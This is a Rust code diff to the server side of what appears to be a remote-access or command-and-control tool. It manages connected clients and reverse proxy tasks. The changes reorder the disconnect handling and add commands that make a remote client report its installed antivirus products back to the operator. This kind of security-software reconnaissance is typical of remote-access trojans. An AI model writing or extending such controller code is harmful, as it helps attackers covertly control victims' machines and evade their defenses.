@@ -398,18 +398,15 @@ impl ServerWrapper {
                     self.log_events.tauri_handle = Some(self.tauri_handle.clone().unwrap());
                 }
                 ClientDisconnected(addr) => {
-                    self.txs.remove(&addr);
-
-                    if let Some(client_info) = self.connected_users.get(&addr) {
-                        let username = client_info.username.clone();
-                        self.emit_client_status(&username, &addr, "client_disconnected").await;
-                        let message = format!("Client [{}] {} disconnected!", addr, username);
+                    if let Some(client) = self.connected_users.get(&addr) {
+                        let message = format!("Client [{}] [{}] disconnected", addr, client.username);
                         self.log_events.log("client_disconnected", &message).await;
+                        self.emit_client_status(&client.username, &addr, "client_disconnected").await;
                     }
-                    
-                    self.connected_users.remove(&addr);
+
+                    self.txs.remove(&addr);
                     self.reverse_proxy_tasks.remove(&addr);
-                },
+                }
                 DisconnectClient(addr) => {
                     self.send_client_packet(&addr, ClientboundPacket::Disconnect).await;
                 }
@@ -623,6 +620,27 @@ impl ServerWrapper {
                     }
 
                     self.reverse_proxy_tasks.remove(&addr);
+                }
+                GetInstalledAVs(addr) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Get Installed AVs on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
+                    self.send_client_packet(&addr, ClientboundPacket::GetInstalledAVs).await;
+                }
+                InstalledAVs(addr, av_list) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Received installed AVs from client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_rcvd", &message).await;
+
+                    let payload = serde_json::json!({
+                        "addr": addr.to_string(),
+                        "avs": av_list.avs.clone()
+                    });
+
+                    self.emit_serde_payload("installed_avs", payload).await;
                 }
             }
         }
